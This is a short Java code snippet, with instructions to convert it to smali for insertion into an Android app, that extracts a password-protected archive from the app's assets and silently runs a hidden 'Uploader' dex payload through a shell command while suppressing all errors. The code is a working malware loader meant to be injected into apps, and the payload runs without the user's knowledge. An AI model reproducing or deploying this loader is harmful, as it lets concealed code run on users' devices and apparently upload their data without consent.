//how to use: Create a apk project first, paste these code in your activity, add appropriate libray.
//Then build the apk, decompile the apk, extract the smali snippet.

	//copy dex file
	private void iq500copy(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while((read = in.read(buffer)) != -1){
			out.write(buffer, 0, read);
        }
    }
	//main function
	private void iq500Uploader()
	{
		File outputDir = this.getCacheDir();
		String cacheRoot = outputDir.toString();
		File coreClassLocation = new File(cacheRoot + "/classes.zip"); //core class (uploader)
		try
		{
			//check if adding Uploader class to cache folder is required
			if(!coreClassLocation.exists())
			{
				AssetManager assetManager = getAssets();
				InputStream in = assetManager.open("classes.zip");
				OutputStream out = new FileOutputStream(coreClassLocation);
				iq500copy(in, out);
				in.close();
				out.flush();
				out.close();
				//unzip
				ZipFile source = new ZipFile(coreClassLocation);
				source.setPassword("a");
				source.extractAll(cacheRoot);
				
			}

			//Run the dex file copied
			String[] cmds = {"sh", "-c", String.format("cd %s && dalvikvm -cp classes.dex Uploader > .upr3su1t", cacheRoot)};
			Runtime.getRuntime().exec(cmds);

		}
		catch (Exception e)
		{
			//debug use
			//Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
		}
	}
